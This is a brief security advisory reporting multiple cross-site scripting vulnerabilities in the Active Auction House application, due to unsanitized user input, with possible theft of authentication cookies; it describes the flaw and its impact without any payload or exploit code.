Active Auction House is reportedly affected by multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.

An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
